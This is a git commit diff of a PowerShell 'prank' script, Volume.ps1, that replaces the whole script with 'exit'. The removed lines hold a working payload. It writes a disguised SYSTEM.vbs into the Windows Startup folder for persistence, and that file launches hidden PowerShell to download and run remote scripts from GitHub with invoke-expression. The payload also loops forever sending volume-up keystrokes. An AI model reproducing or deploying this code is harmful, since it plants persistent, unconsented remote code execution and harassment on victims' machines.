c433d251974122d0fd62d2d41c547e4ab20e51cf
Falcon <101268424+Falconnix@users.noreply.github.com>
2023-05-03 19:51:38 -0400

    Update Volume.ps1

--- Volume.ps1
+++ Volume.ps1
@@ -1,7 +1,1 @@
-cd 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
-Start-Sleep -Seconds 1
-New-Item 'SYSTEM.vbs' -ItemType File
-Start-Sleep -Seconds 1
-$content = 'Set objShell = CreateObject("WScript.Shell"):objShell.Run("powershell.exe $pl = iwr https://raw.githubusercontent.com/Hackstur/JokerShell/master/System/RickRoll-Powershell.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/Volume.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/beep.ps1; invoke-expression $pl")' | out-file -filepath SYSTEM.vbs
-
-while (1) {Start-Sleep -Seconds 2;$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}}
+exit
